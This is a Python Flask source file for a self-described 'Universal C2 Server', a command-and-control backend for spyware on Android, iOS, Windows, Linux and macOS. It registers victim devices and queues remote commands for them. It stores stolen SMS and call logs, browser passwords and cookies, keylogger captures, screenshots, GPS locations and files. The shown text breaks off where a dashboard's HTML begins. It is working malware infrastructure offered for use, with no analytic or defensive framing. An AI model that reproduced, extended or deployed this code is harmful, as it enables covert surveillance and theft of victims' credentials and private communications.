#!/usr/bin/env python3
"""
UNIVERSAL C2 SERVER - Cross-Platform Compatibility
Works with: Windows, Linux, macOS, Android, iOS, Tablets
Render.com compatible
"""
from flask import Flask, request, jsonify, send_file, Response
from flask_cors import CORS
import time
import uuid
import json
import sqlite3
import threading
import os
import hashlib
import base64
from datetime import datetime
import logging
import mimetypes
from typing import Dict, List, Optional
import re

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})

# ============================================================================
# CONFIGURATION
# ============================================================================

DATABASE = 'universal_c2.db'
MEDIA_FOLDER = 'media'
SCREENSHOTS_FOLDER = 'screenshots'
KEYLOGS_FOLDER = 'keylogs'
FILES_FOLDER = 'files'

# Create directories
for folder in [MEDIA_FOLDER, SCREENSHOTS_FOLDER, KEYLOGS_FOLDER, FILES_FOLDER]:
    os.makedirs(folder, exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('server.log')
    ]
)
logger = logging.getLogger(__name__)

SERVER_START_TIME = time.time()

# ============================================================================
# DATABASE SCHEMA
# ============================================================================

def init_db():
    """Initialize database with cross-platform schema"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    # Devices table - Universal
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            device_id TEXT PRIMARY KEY,
            device_name TEXT,
            device_type TEXT,  -- phone, tablet, desktop, laptop
            platform TEXT,     -- android, ios, windows, linux, macos
            platform_version TEXT,
            manufacturer TEXT,
            model TEXT,
            imei TEXT,
            serial_number TEXT,
            ip_address TEXT,
            mac_address TEXT,
            last_seen REAL,
            first_seen REAL,
            status TEXT DEFAULT 'offline',
            battery_level INTEGER,
            network_type TEXT,  -- wifi, cellular, ethernet
            operator TEXT,
            country_code TEXT,
            language TEXT,
            timezone TEXT,
            root_access INTEGER DEFAULT 0,
            screen_width INTEGER,
            screen_height INTEGER,
            storage_total INTEGER,
            storage_free INTEGER,
            ram_total INTEGER,
            ram_free INTEGER,
            cpu_cores INTEGER,
            cpu_arch TEXT
        )
    ''')
    
    # Sessions table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            session_id TEXT PRIMARY KEY,
            device_id TEXT,
            start_time REAL,
            end_time REAL,
            duration INTEGER,
            data_sent INTEGER,
            data_received INTEGER,
            commands_executed INTEGER
        )
    ''')
    
    # Commands table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            command_id TEXT PRIMARY KEY,
            device_id TEXT,
            command_type TEXT,  -- system, file, media, network, sms, etc.
            command_text TEXT,
            status TEXT DEFAULT 'pending',
            result TEXT,
            created_at REAL,
            executed_at REAL,
            requires_root INTEGER DEFAULT 0
        )
    ''')
    
    # Media files table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS media (
            media_id TEXT PRIMARY KEY,
            device_id TEXT,
            file_type TEXT,  -- screenshot, photo, video, audio, document
            file_path TEXT,
            file_name TEXT,
            file_size INTEGER,
            mime_type TEXT,
            thumbnail_path TEXT,
            created_at REAL,
            metadata TEXT  -- JSON with GPS, orientation, etc.
        )
    ''')
    
    # SMS/Call logs table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS communications (
            comm_id TEXT PRIMARY KEY,
            device_id TEXT,
            type TEXT,  -- sms, call, contact
            phone_number TEXT,
            contact_name TEXT,
            content TEXT,
            timestamp REAL,
            direction TEXT,  -- incoming, outgoing, missed
            duration INTEGER,
            read_status INTEGER
        )
    ''')
    
    # Browser data table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS browser_data (
            browser_id TEXT PRIMARY KEY,
            device_id TEXT,
            browser_name TEXT,
            url TEXT,
            title TEXT,
            visit_count INTEGER,
            last_visit REAL,
            username TEXT,
            password_hash TEXT,
            cookie_data TEXT,
            bookmark TEXT,
            download_history TEXT
        )
    ''')
    
    # Keylogs table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keylogs (
            keylog_id TEXT PRIMARY KEY,
            device_id TEXT,
            application TEXT,
            window_title TEXT,
            keystrokes TEXT,
            timestamp REAL,
            screenshot_path TEXT
        )
    ''')
    
    # Location data table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS locations (
            location_id TEXT PRIMARY KEY,
            device_id TEXT,
            latitude REAL,
            longitude REAL,
            accuracy REAL,
            altitude REAL,
            speed REAL,
            timestamp REAL,
            provider TEXT,
            address TEXT
        )
    ''')
    
    # Application data table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS applications (
            app_id TEXT PRIMARY KEY,
            device_id TEXT,
            package_name TEXT,
            app_name TEXT,
            version TEXT,
            installed_date REAL,
            last_updated REAL,
            permissions TEXT,
            data_path TEXT,
            is_system_app INTEGER
        )
    ''')
    
    conn.commit()
    conn.close()
    logger.info("Universal database initialized")

def get_db():
    """Get database connection"""
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

# ============================================================================
# DEVICE MANAGEMENT
# ============================================================================

@app.route('/api/v1/device/register', methods=['POST'])
def device_register():
    """Register a new device (any platform)"""
    try:
        data = request.json
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        device_id = data.get('device_id')
        if not device_id:
            return jsonify({'error': 'Missing device_id'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        current_time = time.time()
        
        # Check if device exists
        cursor.execute('SELECT * FROM devices WHERE device_id = ?', (device_id,))
        existing = cursor.fetchone()
        
        device_info = {
            'device_id': device_id,
            'device_name': data.get('device_name', 'Unknown Device'),
            'device_type': data.get('device_type', 'unknown'),
            'platform': data.get('platform', 'unknown'),
            'platform_version': data.get('platform_version', ''),
            'manufacturer': data.get('manufacturer', ''),
            'model': data.get('model', ''),
            'imei': data.get('imei', ''),
            'serial_number': data.get('serial_number', ''),
            'ip_address': request.remote_addr,
            'last_seen': current_time,
            'status': 'online',
            'battery_level': data.get('battery_level'),
            'network_type': data.get('network_type'),
            'operator': data.get('operator'),
            'country_code': data.get('country_code'),
            'language': data.get('language', 'en'),
            'timezone': data.get('timezone'),
            'root_access': data.get('root_access', 0),
            'screen_width': data.get('screen_width'),
            'screen_height': data.get('screen_height'),
            'storage_total': data.get('storage_total'),
            'storage_free': data.get('storage_free'),
            'ram_total': data.get('ram_total'),
            'ram_free': data.get('ram_free'),
            'cpu_cores': data.get('cpu_cores'),
            'cpu_arch': data.get('cpu_arch')
        }
        
        if existing:
            # Update existing device
            update_fields = []
            values = []
            for key, value in device_info.items():
                if key != 'device_id' and value is not None:
                    update_fields.append(f"{key} = ?")
                    values.append(value)
            
            values.append(device_id)
            query = f"UPDATE devices SET {', '.join(update_fields)} WHERE device_id = ?"
            cursor.execute(query, values)
        else:
            # Insert new device
            device_info['first_seen'] = current_time
            
            columns = ', '.join(device_info.keys())
            placeholders = ', '.join(['?' for _ in device_info])
            values = list(device_info.values())
            
            cursor.execute(f"INSERT INTO devices ({columns}) VALUES ({placeholders})", values)
        
        # Create device-specific folders
        device_folder = os.path.join(MEDIA_FOLDER, device_id[:8])
        os.makedirs(device_folder, exist_ok=True)
        
        for subfolder in ['photos', 'videos', 'screenshots', 'documents', 'audio']:
            os.makedirs(os.path.join(device_folder, subfolder), exist_ok=True)
        
        conn.commit()
        conn.close()
        
        logger.info(f"Device registered: {device_id} ({device_info['platform']})")
        
        return jsonify({
            'status': 'success',
            'device_id': device_id,
            'server_time': current_time,
            'message': 'Device registered successfully'
        }), 200
        
    except Exception as e:
        logger.error(f"Device registration error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/v1/device/heartbeat', methods=['POST'])
def device_heartbeat():
    """Device heartbeat"""
    try:
        data = request.json
        device_id = data.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Missing device_id'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        current_time = time.time()
        
        # Update device status
        cursor.execute('''
            UPDATE devices 
            SET last_seen = ?, status = 'online',
                battery_level = COALESCE(?, battery_level),
                network_type = COALESCE(?, network_type),
                ip_address = ?
            WHERE device_id = ?
        ''', (
            current_time,
            data.get('battery_level'),
            data.get('network_type'),
            request.remote_addr,
            device_id
        ))
        
        conn.commit()
        conn.close()
        
        return jsonify({'status': 'ok', 'timestamp': current_time}), 200
        
    except Exception as e:
        logger.error(f"Heartbeat error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/v1/devices', methods=['GET'])
def get_devices():
    """Get all registered devices"""
    try:
        device_type = request.args.get('type')
        platform = request.args.get('platform')
        
        conn = get_db()
        cursor = conn.cursor()
        
        current_time = time.time()
        
        # Update status based on last_seen
        cursor.execute('''
            UPDATE devices 
            SET status = CASE 
                WHEN ? - last_seen > 300 THEN 'offline'
                WHEN ? - last_seen > 60 THEN 'idle'
                ELSE 'online'
            END
        ''', (current_time, current_time))
        
        conn.commit()
        
        # Build query
        query = '''
            SELECT d.*,
                   COUNT(DISTINCT c.command_id) as command_count,
                   COUNT(DISTINCT m.media_id) as media_count
            FROM devices d
            LEFT JOIN commands c ON d.device_id = c.device_id
            LEFT JOIN media m ON d.device_id = m.device_id
            WHERE 1=1
        '''
        params = []
        
        if device_type:
            query += ' AND d.device_type = ?'
            params.append(device_type)
        
        if platform:
            query += ' AND d.platform = ?'
            params.append(platform)
        
        query += ' GROUP BY d.device_id ORDER BY d.last_seen DESC'
        
        cursor.execute(query, params)
        
        devices = []
        for row in cursor.fetchall():
            time_diff = current_time - row['last_seen']
            
            # Determine status with emoji
            if time_diff < 60:
                status_emoji = '🟢'
                status_text = 'online'
            elif time_diff < 300:
                status_emoji = '🟡'
                status_text = 'idle'
            else:
                status_emoji = '🔴'
                status_text = 'offline'
            
            # Platform icon
            platform_icon = {
                'android': '🤖',
                'ios': '🍎',
                'windows': '🪟',
                'linux': '🐧',
                'macos': '💻',
                'phone': '📱',
                'tablet': '📟'
            }.get(row['platform'].lower(), '📱')
            
            devices.append({
                'device_id': row['device_id'],
                'device_name': row['device_name'],
                'device_type': row['device_type'],
                'platform': row['platform'],
                'platform_icon': platform_icon,
                'model': row['model'],
                'status': row['status'],
                'status_display': f"{status_emoji} {status_text}",
                'battery_level': row['battery_level'],
                'network_type': row['network_type'],
                'last_seen': row['last_seen'],
                'last_seen_str': datetime.fromtimestamp(row['last_seen']).strftime('%H:%M:%S'),
                'command_count': row['command_count'] or 0,
                'media_count': row['media_count'] or 0,
                'ip_address': row['ip_address'],
                'screen_resolution': f"{row['screen_width']}x{row['screen_height']}" if row['screen_width'] and row['screen_height'] else 'Unknown'
            })
        
        conn.close()
        
        return jsonify({
            'devices': devices,
            'total': len(devices),
            'online': len([d for d in devices if d['status'] == 'online'])
        }), 200
        
    except Exception as e:
        logger.error(f"Get devices error: {e}")
        return jsonify({'devices': [], 'error': str(e)}), 500

# ============================================================================
# COMMAND SYSTEM
# ============================================================================

@app.route('/api/v1/command/send', methods=['POST'])
def send_command():
    """Send command to device"""
    try:
        data = request.json
        device_id = data.get('device_id')
        command = data.get('command')
        command_type = data.get('command_type', 'system')
        
        if not device_id or not command:
            return jsonify({'error': 'Missing device_id or command'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        # Check if device exists
        cursor.execute('SELECT status FROM devices WHERE device_id = ?', (device_id,))
        device = cursor.fetchone()
        
        if not device:
            conn.close()
            return jsonify({'error': 'Device not found'}), 404
        
        # Create command record
        command_id = str(uuid.uuid4())
        
        cursor.execute('''
            INSERT INTO commands 
            (command_id, device_id, command_type, command_text, status, created_at)
            VALUES (?, ?, ?, ?, 'pending', ?)
        ''', (command_id, device_id, command_type, command, time.time()))
        
        conn.commit()
        conn.close()
        
        logger.info(f"Command sent: {command_id[:8]} -> {device_id[:8]}: {command[:50]}")
        
        return jsonify({
            'success': True,
            'command_id': command_id,
            'message': 'Command queued'
        }), 200
        
    except Exception as e:
        logger.error(f"Command send error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/v1/commands/<device_id>', methods=['GET'])
def get_commands(device_id):
    """Get pending commands for device"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        # Update device last seen
        cursor.execute('UPDATE devices SET last_seen = ? WHERE device_id = ?', 
                      (time.time(), device_id))
        
        # Get pending commands
        cursor.execute('''
            SELECT command_id, command_type, command_text, created_at 
            FROM commands 
            WHERE device_id = ? AND status = 'pending'
            ORDER BY created_at ASC
            LIMIT 20
        ''', (device_id,))
        
        commands = []
        for row in cursor.fetchall():
            commands.append({
                'command_id': row['command_id'],
                'command_type': row['command_type'],
                'command': row['command_text'],
                'created_at': row['created_at'],
                'age': time.time() - row['created_at']
            })
        
        # Mark as sent
        if commands:
            cmd_ids = [cmd['command_id'] for cmd in commands]
            placeholders = ','.join(['?' for _ in cmd_ids])
            cursor.execute(f'''
                UPDATE commands SET status = 'sent'
                WHERE command_id IN ({placeholders})
            ''', cmd_ids)
        
        conn.commit()
        conn.close()
        
        return jsonify({'commands': commands}), 200
        
    except Exception as e:
        logger.error(f"Get commands error: {e}")
        return jsonify({'commands': []}), 500

@app.route('/api/v1/command/result', methods=['POST'])
def submit_result():
    """Submit command result"""
    try:
        data = request.json
        command_id = data.get('command_id')
        result = data.get('result', '')
        status = data.get('status', 'completed')
        
        if not command_id:
            return jsonify({'error': 'Missing command_id'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        # Update command record
        cursor.execute('''
            UPDATE commands 
            SET status = ?, result = ?, executed_at = ?
            WHERE command_id = ?
        ''', (status, result, time.time(), command_id))
        
        conn.commit()
        conn.close()
        
        logger.info(f"Command result: {command_id[:8]} -> {status}")
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        logger.error(f"Submit result error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/v1/command/result/<command_id>', methods=['GET'])
def get_command_result(command_id):
    """Get command result"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT c.*, d.device_name, d.platform 
            FROM commands c
            LEFT JOIN devices d ON c.device_id = d.device_id
            WHERE c.command_id = ?
        ''', (command_id,))
        
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return jsonify({
                'success': True,
                'command_id': row['command_id'],
                'device_id': row['device_id'],
                'device_name': row['device_name'],
                'platform': row['platform'],
                'command_type': row['command_type'],
                'command_text': row['command_text'],
                'status': row['status'],
                'result': row['result'] or '',
                'created_at': row['created_at'],
                'executed_at': row['executed_at']
            }), 200
        else:
            return jsonify({
                'success': False,
                'error': 'Command not found'
            }), 404
            
    except Exception as e:
        logger.error(f"Get result error: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================================================
# MEDIA & FILE MANAGEMENT
# ============================================================================

@app.route('/api/v1/media/upload', methods=['POST'])
def upload_media():
    """Upload media/file from device"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        device_id = request.form.get('device_id')
        file_type = request.form.get('file_type', 'unknown')
        metadata = request.form.get('metadata', '{}')
        
        if not device_id:
            return jsonify({'error': 'Missing device_id'}), 400
        
        # Validate device exists
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute('SELECT device_name FROM devices WHERE device_id = ?', (device_id,))
        device = cursor.fetchone()
        
        if not device:
            conn.close()
            return jsonify({'error': 'Device not found'}), 404
        
        device_name = device['device_name']
        conn.close()
        
        # Determine file category based on type or extension
        filename = file.filename.lower()
        
        if file_type == 'screenshot' or 'screenshot' in filename:
            category = 'screenshots'
            mime_type = 'image'
        elif file_type == 'photo' or any(filename.endswith(ext) for ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']):
            category = 'photos'
            mime_type = 'image'
        elif file_type == 'video' or any(filename.endswith(ext) for ext in ['.mp4', '.avi', '.mov', '.mkv', '.webm']):
            category = 'videos'
            mime_type = 'video'
        elif file_type == 'audio' or any(filename.endswith(ext) for ext in ['.mp3', '.wav', '.m4a', '.ogg']):
            category = 'audio'
            mime_type = 'audio'
        elif file_type == 'document' or any(filename.endswith(ext) for ext in ['.pdf', '.doc', '.docx', '.xls', '.xlsx', '.txt', '.log']):
            category = 'documents'
            mime_type = 'document'
        else:
            category = 'other'
            mime_type = mimetypes.guess_type(filename)[0] or 'application/octet-stream'
        
        # Create organized folder structure
        device_folder = os.path.join(MEDIA_FOLDER, device_id[:8])
        category_folder = os.path.join(device_folder, category)
        os.makedirs(category_folder, exist_ok=True)
        
        # Generate unique filename
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        unique_filename = f"{timestamp}_{file.filename.replace(' ', '_')}"
        filepath = os.path.join(category_folder, unique_filename)
        
        # Save file
        file.save(filepath)
        filesize = os.path.getsize(filepath)
        
        # Create thumbnail for images (optional)
        thumbnail_path = None
        if mime_type.startswith('image'):
            try:
                from PIL import Image
                img = Image.open(filepath)
                img.thumbnail((200, 200))
                thumbnail_path = filepath.replace('.', '_thumb.')
                img.save(thumbnail_path)
            except:
                thumbnail_path = None
        
        # Save to database
        media_id = str(uuid.uuid4())
        
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO media 
            (media_id, device_id, file_type, file_path, file_name, 
             file_size, mime_type, thumbnail_path, created_at, metadata)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            media_id, device_id, file_type, filepath, file.filename,
            filesize, mime_type, thumbnail_path, time.time(), metadata
        ))
        
        conn.commit()
        conn.close()
        
        logger.info(f"Media uploaded: {file.filename} ({filesize} bytes) from {device_id[:8]}")
        
        return jsonify({
            'success': True,
            'media_id': media_id,
            'filename': file.filename,
            'file_type': file_type,
            'size': filesize,
            'category': category,
            'thumbnail': thumbnail_path is not None
        }), 200
        
    except Exception as e:
        logger.error(f"Media upload error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/v1/media/list/<device_id>', methods=['GET'])
def list_media(device_id):
    """List media/files for device"""
    try:
        file_type = request.args.get('type')
        limit = int(request.args.get('limit', 50))
        
        conn = get_db()
        cursor = conn.cursor()
        
        query = '''
            SELECT media_id, file_type, file_name, file_size, 
                   mime_type, thumbnail_path, created_at, metadata
            FROM media 
            WHERE device_id = ?
        '''
        params = [device_id]
        
        if file_type:
            query += ' AND file_type = ?'
            params.append(file_type)
        
        query += ' ORDER BY created_at DESC LIMIT ?'
        params.append(limit)
        
        cursor.execute(query, params)
        
        media_list = []
        for row in cursor.fetchall():
            media_list.append({
                'media_id': row['media_id'],
                'file_type': row['file_type'],
                'filename': row['file_name'],
                'size': row['file_size'],
                'size_str': f"{row['file_size'] / 1024 / 1024:.2f} MB" if row['file_size'] > 1024*1024 else f"{row['file_size'] / 1024:.1f} KB",
                'mime_type': row['mime_type'],
                'has_thumbnail': row['thumbnail_path'] is not None,
                'created_at': row['created_at'],
                'time_str': datetime.fromtimestamp(row['created_at']).strftime('%H:%M:%S'),
                'date_str': datetime.fromtimestamp(row['created_at']).strftime('%Y-%m-%d'),
                'metadata': json.loads(row['metadata']) if row['metadata'] else {}
            })
        
        conn.close()
        
        return jsonify({
            'media': media_list,
            'total': len(media_list),
            'device_id': device_id
        }), 200
        
    except Exception as e:
        logger.error(f"List media error: {e}")
        return jsonify({'media': [], 'error': str(e)}), 500

@app.route('/api/v1/media/download/<media_id>', methods=['GET'])
def download_media(media_id):
    """Download media/file"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('SELECT file_path, file_name, mime_type FROM media WHERE media_id = ?', (media_id,))
        row = cursor.fetchone()
        
        if not row or not os.path.exists(row['file_path']):
            conn.close()
            return jsonify({'error': 'File not found'}), 404
        
        file_path = row['file_path']
        filename = row['file_name']
        mime_type = row['mime_type'] or 'application/octet-stream'
        
        conn.close()
        
        # Stream the file
        def generate():
            with open(file_path, 'rb') as f:
                while chunk := f.read(8192):
                    yield chunk
        
        response = Response(generate(), mimetype=mime_type)
        response.headers['Content-Disposition'] = f'attachment; filename="{filename}"'
        response.headers['Content-Length'] = os.path.getsize(file_path)
        
        return response
        
    except Exception as e:
        logger.error(f"Download error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/v1/media/preview/<media_id>', methods=['GET'])
def preview_media(media_id):
    """Preview media (images/videos)"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('SELECT file_path, mime_type, thumbnail_path FROM media WHERE media_id = ?', (media_id,))
        row = cursor.fetchone()
        conn.close()
        
        if not row or not os.path.exists(row['file_path']):
            return jsonify({'error': 'File not found'}), 404
        
        # Use thumbnail if available for images
        file_path = row['thumbnail_path'] or row['file_path']
        mime_type = row['mime_type'] or 'application/octet-stream'
        
        if not os.path.exists(file_path):
            file_path = row['file_path']
        
        return send_file(file_path, mimetype=mime_type)
        
    except Exception as e:
        logger.error(f"Preview error: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================================================
# SMS & COMMUNICATIONS
# ============================================================================

@app.route('/api/v1/communications/upload', methods=['POST'])
def upload_communications():
    """Upload SMS/call logs"""
    try:
        data = request.json
        device_id = data.get('device_id')
        communications = data.get('communications', [])
        
        if not device_id or not communications:
            return jsonify({'error': 'Missing device_id or communications'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        inserted = 0
        for comm in communications:
            comm_id = str(uuid.uuid4())
            
            cursor.execute('''
                INSERT INTO communications 
                (comm_id, device_id, type, phone_number, contact_name, 
                 content, timestamp, direction, duration, read_status)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                comm_id,
                device_id,
                comm.get('type', 'sms'),
                comm.get('phone_number', ''),
                comm.get('contact_name', ''),
                comm.get('content', ''),
                comm.get('timestamp', time.time()),
                comm.get('direction', 'unknown'),
                comm.get('duration', 0),
                comm.get('read_status', 0)
            ))
            
            inserted += 1
        
        conn.commit()
        conn.close()
        
        logger.info(f"Communications uploaded: {inserted} records from {device_id[:8]}")
        
        return jsonify({
            'success': True,
            'inserted': inserted,
            'message': f'{inserted} communications uploaded'
        }), 200
        
    except Exception as e:
        logger.error(f"Communications upload error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/v1/communications/<device_id>', methods=['GET'])
def get_communications(device_id):
    """Get communications for device"""
    try:
        comm_type = request.args.get('type')
        limit = int(request.args.get('limit', 100))
        
        conn = get_db()
        cursor = conn.cursor()
        
        query = '''
            SELECT comm_id, type, phone_number, contact_name, content,
                   timestamp, direction, duration, read_status
            FROM communications 
            WHERE device_id = ?
        '''
        params = [device_id]
        
        if comm_type:
            query += ' AND type = ?'
            params.append(comm_type)
        
        query += ' ORDER BY timestamp DESC LIMIT ?'
        params.append(limit)
        
        cursor.execute(query, params)
        
        communications = []
        for row in cursor.fetchall():
            communications.append({
                'id': row['comm_id'],
                'type': row['type'],
                'phone_number': row['phone_number'],
                'contact_name': row['contact_name'],
                'content': row['content'],
                'timestamp': row['timestamp'],
                'time_str': datetime.fromtimestamp(row['timestamp']).strftime('%H:%M:%S'),
                'date_str': datetime.fromtimestamp(row['timestamp']).strftime('%Y-%m-%d'),
                'direction': row['direction'],
                'duration': row['duration'],
                'read_status': bool(row['read_status'])
            })
        
        conn.close()
        
        return jsonify({
            'communications': communications,
            'total': len(communications),
            'device_id': device_id
        }), 200
        
    except Exception as e:
        logger.error(f"Get communications error: {e}")
        return jsonify({'communications': [], 'error': str(e)}), 500

# ============================================================================
# BROWSER DATA
# ============================================================================

@app.route('/api/v1/browser/upload', methods=['POST'])
def upload_browser_data():
    """Upload browser data (history, passwords, cookies)"""
    try:
        data = request.json
        device_id = data.get('device_id')
        browser_data = data.get('browser_data', [])
        
        if not device_id or not browser_data:
            return jsonify({'error': 'Missing device_id or browser_data'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        inserted = 0
        for browser in browser_data:
            browser_id = str(uuid.uuid4())
            
            cursor.execute('''
                INSERT INTO browser_data 
                (browser_id, device_id, browser_name, url, title,
                 visit_count, last_visit, username, password_hash,
                 cookie_data, bookmark, download_history)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                browser_id,
                device_id,
                browser.get('browser_name', 'unknown'),
                browser.get('url', ''),
                browser.get('title', ''),
                browser.get('visit_count', 0),
                browser.get('last_visit', time.time()),
                browser.get('username', ''),
                browser.get('password_hash', ''),
                json.dumps(browser.get('cookies', [])),
                browser.get('bookmark', ''),
                json.dumps(browser.get('download_history', []))
            ))
            
            inserted += 1
        
        conn.commit()
        conn.close()
        
        logger.info(f"Browser data uploaded: {inserted} records from {device_id[:8]}")
        
        return jsonify({
            'success': True,
            'inserted': inserted,
            'message': f'{inserted} browser records uploaded'
        }), 200
        
    except Exception as e:
        logger.error(f"Browser upload error: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================================================
# KEYLOGS
# ============================================================================

@app.route('/api/v1/keylogs/upload', methods=['POST'])
def upload_keylogs():
    """Upload keylogger data"""
    try:
        data = request.json
        device_id = data.get('device_id')
        keylogs = data.get('keylogs', [])
        
        if not device_id or not keylogs:
            return jsonify({'error': 'Missing device_id or keylogs'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        inserted = 0
        for log in keylogs:
            keylog_id = str(uuid.uuid4())
            
            cursor.execute('''
                INSERT INTO keylogs 
                (keylog_id, device_id, application, window_title,
                 keystrokes, timestamp, screenshot_path)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                keylog_id,
                device_id,
                log.get('application', 'unknown'),
                log.get('window_title', ''),
                log.get('keystrokes', ''),
                log.get('timestamp', time.time()),
                log.get('screenshot_path', '')
            ))
            
            inserted += 1
        
        conn.commit()
        conn.close()
        
        logger.info(f"Keylogs uploaded: {inserted} records from {device_id[:8]}")
        
        return jsonify({
            'success': True,
            'inserted': inserted,
            'message': f'{inserted} keylog records uploaded'
        }), 200
        
    except Exception as e:
        logger.error(f"Keylogs upload error: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================================================
# STATISTICS & MONITORING
# ============================================================================

@app.route('/api/v1/stats', methods=['GET'])
def get_stats():
    """Get server statistics"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        current_time = time.time()
        
        # Count devices
        cursor.execute('SELECT COUNT(*) FROM devices')
        total_devices = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM devices WHERE ? - last_seen <= 60', (current_time,))
        online_devices = cursor.fetchone()[0]
        
        # Count by platform
        cursor.execute('SELECT platform, COUNT(*) as count FROM devices GROUP BY platform')
        platforms = {}
        for row in cursor.fetchall():
            platforms[row['platform']] = row['count']
        
        # Count media
        cursor.execute('SELECT COUNT(*) FROM media')
        total_media = cursor.fetchone()[0]
        
        cursor.execute('SELECT file_type, COUNT(*) as count FROM media GROUP BY file_type')
        media_by_type = {}
        for row in cursor.fetchall():
            media_by_type[row['file_type']] = row['count']
        
        # Count communications
        cursor.execute('SELECT COUNT(*) FROM communications')
        total_communications = cursor.fetchone()[0]
        
        cursor.execute('SELECT type, COUNT(*) as count FROM communications GROUP BY type')
        comms_by_type = {}
        for row in cursor.fetchall():
            comms_by_type[row['type']] = row['count']
        
        # Count commands
        cursor.execute('SELECT COUNT(*) FROM commands')
        total_commands = cursor.fetchone()[0]
        
        cursor.execute('SELECT status, COUNT(*) as count FROM commands GROUP BY status')
        commands_by_status = {}
        for row in cursor.fetchall():
            commands_by_status[row['status']] = row['count']
        
        conn.close()
        
        # Server uptime
        uptime = current_time - SERVER_START_TIME
        hours = int(uptime // 3600)
        minutes = int((uptime % 3600) // 60)
        
        # Storage usage
        total_size = 0
        for root, dirs, files in os.walk(MEDIA_FOLDER):
            for file in files:
                try:
                    total_size += os.path.getsize(os.path.join(root, file))
                except:
                    pass
        
        return jsonify({
            'server': {
                'version': '2.0',
                'uptime': f"{hours}h {minutes}m",
                'start_time': SERVER_START_TIME,
                'current_time': current_time
            },
            'devices': {
                'total': total_devices,
                'online': online_devices,
                'offline': total_devices - online_devices,
                'by_platform': platforms
            },
            'media': {
                'total': total_media,
                'by_type': media_by_type,
                'total_size': total_size,
                'total_size_str': f"{total_size / 1024 / 1024 / 1024:.2f} GB"
            },
            'communications': {
                'total': total_communications,
                'by_type': comms_by_type
            },
            'commands': {
                'total': total_commands,
                'by_status': commands_by_status
            },
            'storage': {
                'media_folder': MEDIA_FOLDER,
                'screenshots_folder': SCREENSHOTS_FOLDER,
                'keylogs_folder': KEYLOGS_FOLDER
            }
        }), 200
        
    except Exception as e:
        logger.error(f"Get stats error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/v1/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    try:
        # Check database
        db_status = 'ok'
        try:
            conn = get_db()
            cursor = conn.cursor()
            cursor.execute('SELECT 1')
            conn.close()
        except Exception as e:
            db_status = f'error: {e}'
        
        # Check disk space
        import shutil
        disk_usage = shutil.disk_usage('.')
        
        return jsonify({
            'status': 'healthy',
            'timestamp': time.time(),
            'version': '2.0',
            'database': db_status,
            'disk': {
                'total': disk_usage.total,
                'free': disk_usage.free,
                'used': disk_usage.used,
                'percent': (disk_usage.used / disk_usage.total) * 100
            },
            'endpoints': {
                'devices': '/api/v1/devices',
                'commands': '/api/v1/command/send',
                'media': '/api/v1/media/upload',
                'communications': '/api/v1/communications/upload',
                'stats': '/api/v1/stats'
            }
        }), 200
        
    except Exception as e:
        return jsonify({'status': 'unhealthy', 'error': str(e)}), 500

# ============================================================================
# WEB INTERFACE
# ============================================================================

@app.route('/')
def index():
    """Web dashboard"""
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Universal Security Dashboard</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            
            body {
